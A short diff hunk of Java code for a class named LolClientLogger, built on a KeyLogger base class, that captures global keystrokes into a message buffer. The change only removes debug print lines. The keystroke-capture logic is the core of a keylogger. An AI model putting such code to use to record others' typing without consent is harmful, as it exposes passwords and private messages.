@@ -36,15 +36,12 @@ public class LolClientLogger extends KeyLogger implements NativeKeyListener {
                     e1.printStackTrace();
                 }
             } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space")) {
-                System.out.println("2");
                 message = message + " ";
             } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Backspace")) {
-                System.out.println("3");
                 if (message.length() > 0) {
                     message = message.substring(0, message.length() - 1);
                 }
             } else if(NativeKeyEvent.getKeyText(e.getKeyCode()).length() < 2) {
-                System.out.println("4");
                 message = message + NativeKeyEvent.getKeyText(e.getKeyCode());
             }
         }
